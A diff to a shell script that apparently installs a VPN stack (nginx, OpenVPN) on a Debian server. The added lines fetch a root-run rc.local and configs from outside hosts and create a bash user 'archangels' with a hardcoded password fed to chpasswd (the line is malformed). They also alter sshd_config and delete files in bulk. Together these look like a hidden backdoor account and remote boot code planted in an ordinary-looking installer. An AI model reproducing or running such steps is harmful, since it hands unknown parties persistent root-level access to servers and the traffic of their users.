@@ -93,30 +93,28 @@ wget -O /home/vps/public_html/index.html "https://gakod.com/debian/indexx.html"
 service php7.0-fpm start
 service nginx restart
 cd
-# install openvpn
-apt-get install ca-certificates
-wget -O /etc/openvpn/openvpn.tar "https://raw.githubusercontent.com/BangJaguh/tai/main/Ndn/openvpn.tar"
-cd /etc/openvpn/
-tar xf openvpn.tar
-rm -f /etc/openvpn/openvpn.tar
-wget -O /etc/openvpn/587.conf "https://raw.githubusercontent.com/redeviver/script/master/587.conf"
-service openvpn restart
-sysctl -w net.ipv4.ip_forward=1
-sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
-iptables -t nat -I POSTROUTING -s 10.8.100.0/24 -o eth0 -j MASQUERADE
-iptables-save > /etc/iptables_set.conf
-wget -O /etc/network/if-up.d/iptables "https://raw.githubusercontent.com/redeviver/script/master/iptables"
-chmod +x /etc/network/if-up.d/iptables
-service openvpn restart
 
-# configuração openvpn
+#  openvpn
+apt-get -y install openvpn
 cd /etc/openvpn/
-wget -O /etc/openvpn/r3v1v3r.ovpn "https://raw.githubusercontent.com/redeviver/script/master/client-587.conf"
-sed -i $MYIP2 /etc/openvpn/r3v1v3r.ovpn;
-cp r3v1v3r.ovpn /home/vps/public_html/
+wget -O openvpn.tar "http://gakod.com/debian/openvpn.tar"
+tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/rc.local "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/rc.local"
+chmod +x /etc/rc.local
 
-wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/BangJaguh/tai/main/Ndn/client.ovpn"
+# etc
+wget -O /home/vps/public_html/client.ovpn "https://gakod.com/debian/client.ovpn"
+wget -O /home/vps/public_html/client1.ovpn "https://raw.githubusercontent.com/BangJaguh/VPN/main/c/client1.ovpn"
+wget -O /home/vps/public_html/client3.ovpn "https://gakod.com/debian/client3.ovpn"
+wget -O /etc/motd "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/motd"
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client1.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client3.ovpn
+useradd -m -g users -s /bin/bash archangels
+echo "7C22C4ED" | chpasswd
+echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
+cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 
 # Configure Nginx
 sed -i 's/\/var\/www\/html;/\/home\/vps\/public_html\/;/g' /etc/nginx/sites-enabled/default
